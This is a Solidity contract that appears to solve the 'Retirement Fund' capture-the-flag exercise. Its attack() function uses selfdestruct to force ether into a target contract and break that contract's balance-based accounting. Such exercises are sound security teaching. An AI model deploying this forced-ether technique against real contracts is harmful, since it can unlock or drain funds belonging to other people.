// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract AttackRetirementFund {
    address target;

    // be sure to have a payable constructor so you can send some ether to the attack contract
    constructor(address _target) payable {
        target = _target;
    }

    function attack() external {
        //will send its balance to target
        selfdestruct(payable(target));
    }
}
